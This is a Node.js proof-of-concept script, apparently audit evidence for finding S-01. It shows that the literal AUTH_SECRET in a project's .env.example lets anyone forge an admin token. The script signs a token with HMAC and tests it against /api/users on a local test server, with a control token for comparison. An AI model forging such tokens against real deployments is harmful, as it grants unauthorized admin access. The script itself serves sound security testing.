// Evidencia Fase 1 (S-01): con el AUTH_SECRET literal de .env.example se puede fabricar un token de administrador.
// Uso: arrancar un servidor DE PRUEBA con DATA_DIR temporal, NODE_ENV=production y los valores de .env.example; luego
//   BASE=http://localhost:3232 node 04_token_falsificado_env_example.js
const c = require('crypto');
const BASE = process.env.BASE || 'http://localhost:3232';
const SECRET = 'clave-secreta-produccion-minimo-32-caracteres-huarmey-2026'; // valor literal de .env.example
const now = Date.now();
const body = Buffer.from(JSON.stringify({ sub: 'admin', iat: now, exp: now + 8 * 3600 * 1000 })).toString('base64url');
const firmar = (s) => body + '.' + c.createHmac('sha256', s).update(body).digest('base64url');
(async () => {
  const get = (p, t) => fetch(BASE + p, { headers: { Authorization: 'Bearer ' + t } });
  const a = await get('/api/users', firmar(SECRET));
  console.log('Token falsificado con el secreto de .env.example → GET /api/users:', a.status, '(200 = fallo de seguridad)');
  const b = await get('/api/users', firmar('otro-secreto-distinto-de-32-caracteres-xx'));
  console.log('Control: token firmado con otro secreto →', b.status, '(esperado 401)');
})();
